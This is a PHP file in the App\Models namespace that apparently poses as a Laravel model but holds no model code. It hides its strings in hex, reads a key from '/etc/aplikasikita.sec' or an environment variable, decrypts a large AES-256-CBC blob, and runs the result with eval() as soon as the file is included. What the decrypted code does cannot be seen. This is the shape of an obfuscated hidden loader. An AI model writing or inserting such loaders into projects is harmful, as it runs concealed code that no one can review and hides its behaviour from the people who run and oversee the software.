<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('cWBfBZ/c8QFoVbtaSe0DUg==');

$c=base64_decode(

'jM8S9Vr8sNMgSqvVqVicJPJ7G/Vfkrb9XGPvj0V9y4o5FI6NvMP5PnVg9xZnCFKF8eWz2YxEdwKB' .
'inGi7xYZKc3Mup93/k8QgF19s9hFC1MiscdkAVMA1mWd1cYhdHB72W+fzLiQYIhDblH7/B7DiiPe' .
'6SHkGmJXoShaybQmGYhqf3VBYcxo5QqZ+sl9aPjM+YmpmhNcu8N5Uu4AFZ+aBbWk0GS6HZGI3ZUN' .
'tzie+kGqruap/8MsX4rMN0u2Y4xTjxR4ugxi/n2qUcJPmbdgLOVmRdHozlAUlD/gJJ9FBdIyHsRE' .
'UXVsauR77bDMcmaRRQsV5QP8+XPWnwvG7pqwvrfoHs1TeTVZyJfy5KLqHpdaISu0lBFQbjYTdw8A' .
'sRYgixPZlua0EvI/IQGtf9bMrHZTXwwsjce8ZrXRuQB8DA54+EGBAIVi3cc7WTFL6wa/uRXzwQAl' .
'Oe4dFV2bI1Slkqz8j7mLBKmZzN/S8KuojWbJk9+MgKjG/+ep92PVlys6B1wufyKGhK8BStTt3Jcu' .
'nmOzvINiswVYp0FnD8ynnROpS2e7i+0XO62HWwtZtSzsg3HnpzKjJfUPfOxXWevTEMtwXh18MCFt' .
'd0Bmasn28B73MMKm1a8iLRdqfTfGxwI4ZzdihaXFL8pPdIP5aD87YuNPTXPkfvaOj1Fq1blFLCsG' .
'JS5DHJtMlRZibhyjbS8EYa+yEDhb5ziPgp1LHZV59++qfQZKWYorQakk2dCLRYKFG0KZg9FxyiH0' .
'KE1EswiCZd+QwyhykZQs3ef52/by15lV1YCpDNEZf/ZXUAA3firuNMJUBjMWLRv7PVlcHWeOEEcM' .
'cRs/Dxmn78d6uZmzmTJhr4FhwxzhJM9r1clO+HA4UjL1zoSrXaIpYOZVrbG7V1m4ieQoIRADX1VW' .
'mZXd+sEmTMlaeLw+z4Hzsdd8nfAt1mJ3VKUqs+D1Mujw5UzWmcxNX+P7DOwbs4jsx0wK3Gr2oCKR' .
'eu4pAIdmf9KxiVRs0S/BVJZlaXzPayLyh7uW0WG7Vh5vPpS5qmW46B+41ADG8qCrTrTqwDrtv3pH' .
'stincvdyd4gWh80IArXGdln/mY9G6OdfQUkWZXdK7JqrKsNBbrWAH2qc2lebi4sY8AmXB8ctotLF' .
'iG8AzT1pU9CsckiH9GWnk60roQNNAktVLd0w/WKQTUnulnQuT/wPJ6LavkDPYlRKrv9YzVrY0bbs' .
'5IfNPGJ2ZtpIXDvPm8QuGA0Zrh0zRlpOdwo4uMvuEK7m+2GK60ZfZRjUc7h8i/DZUwzXMmkPxBg8' .
'gh76ksx0M4Os8xK76aqzOEjKRzcjQ74='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

